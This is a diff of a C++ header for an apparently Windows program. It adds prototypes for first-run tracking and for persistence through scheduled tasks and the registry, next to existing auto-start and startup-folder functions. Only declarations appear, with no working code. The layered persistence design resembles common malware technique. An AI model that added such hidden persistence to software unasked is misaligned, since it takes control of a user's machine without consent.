@@ -7,13 +7,17 @@
 // Retrieves the dynamic application name from the executable path.
 std::wstring getDynamicAppName();
 bool configureAutoStart(const std::wstring& appName, const std::wstring& appPath);
-//bool configureAutoStart(LPCTSTR appName, LPCTSTR appPath);
-// bool checkAutoStartEnabled(LPCTSTR appName);
+
 bool checkAutoStartEnabled(const std::wstring& appName);
 
 int setupPersistence();
 void setupAndRunScheduledTask();
 bool copyToStartupFolder();
+// Function to mark that the first run has been completed.
+bool isFirstRun();
+void setFirstRunComplete();
+void setupScheduledTaskPersistence();
+void setupRegistryPersistence();
 #endif 
 
 
